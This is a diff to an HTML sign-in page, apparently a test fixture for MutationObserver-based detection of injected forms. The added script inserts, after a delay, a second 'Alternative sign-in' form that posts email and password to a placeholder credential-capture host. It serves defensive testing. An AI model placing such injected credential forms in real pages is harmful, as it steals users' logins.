@@ -60,5 +60,22 @@
         <button type="submit">Sign in</button>
       </form>
     </main>
+    <script>
+      // Inject an additional credential form after a short delay to exercise MutationObserver-based detection
+      setTimeout(() => {
+        const injected = document.createElement('div');
+        injected.innerHTML = `
+          <section style="margin-top:18px; padding-top:12px; border-top:1px dashed #ccc">
+            <h2>Alternative sign-in</h2>
+            <form id="injected" action="https://credential-capture.example.test/session2" method="post">
+              <label>Email<input name="email2" type="email"></label>
+              <label>Password<input name="pw2" type="password"></label>
+              <button type="submit">Sign in</button>
+            </form>
+          </section>
+        `;
+        document.querySelector('main').appendChild(injected);
+      }, 1500);
+    </script>
   </body>
 </html>
